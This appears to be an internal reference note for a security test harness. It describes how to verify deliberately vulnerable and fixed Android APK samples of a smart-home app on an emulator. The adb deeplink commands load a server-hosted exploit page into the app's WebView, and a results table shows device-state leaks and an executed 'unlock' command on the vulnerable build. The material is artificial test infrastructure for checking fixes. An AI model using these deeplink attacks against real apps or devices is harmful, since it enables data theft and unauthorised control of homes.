---
name: verification-workflow
description: End-to-end verification workflow for testing vuln vs fix APKs on emulator
metadata:
  type: reference
---

Every sample change should be verified on the emulator to confirm: vuln leaks data, fix does not.

## Environment

- **Emulator:** MuMu Android 12 (x86_64, SDK 32), ADB at `127.0.0.1:7555`
- **Host IP for MuMu:** Use the host's LAN IP (not `10.0.2.2`). Get it with `python -c "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(('8.8.8.8',80)); print(s.getsockname()[0]); s.close()"`
- **Build:** JDK 21, CMake 4.1.2 installed. Use `subst W:` to bypass Windows 260-char path limit if needed.

## Standard verification flow

```bash
# Connect
adb connect 127.0.0.1:7555

# Clean
rm -rf exp/home-assistant/<id>/received/*

# Install vuln
adb -s 127.0.0.1:7555 install -r apk/home-assistant/vuln/<id>.apk

# Start server
cd exp/home-assistant/<id>/ && python server.py &

# Trigger
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW \
  -d "homeassistant://webview?url=http://<HOST_IP>:8000/exp/<id>"

# Wait 5s, check
ls exp/home-assistant/<id>/received/
cat exp/home-assistant/<id>/received/*

# Repeat for fix
adb -s 127.0.0.1:7555 install -r apk/home-assistant/fix/<id>.apk
rm -rf exp/home-assistant/<id>/received/*
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW \
  -d "homeassistant://webview?url=http://<HOST_IP>:8000/exp/<id>"
sleep 5
cat exp/home-assistant/<id>/received/*
```

## 1.1 verification results (2026-06-07)

| Metric | Vuln | Fix |
|---|---|---|
| JS execution | ✅ | ✅ |
| `HomeAppBridge` accessible | ✅ `bridge=true` | ❌ `bridge=false` |
| `getDeviceState()` leaked | ✅ 5 devices | ❌ |
| `sendCommand("unlock")` executed | ✅ | ❌ |
| Verdict | Vulnerable | Fixed |

## How to apply

Use this workflow for every sample change. The verification step catches issues like:
- Fix branch that doesn't actually fix (e.g., only changed comments — see [[fix-2.1.2-content-access]])
- Vuln branch that doesn't trigger (e.g., deeplink not working, JS not enabled)
- Build issues that prevent APK installation
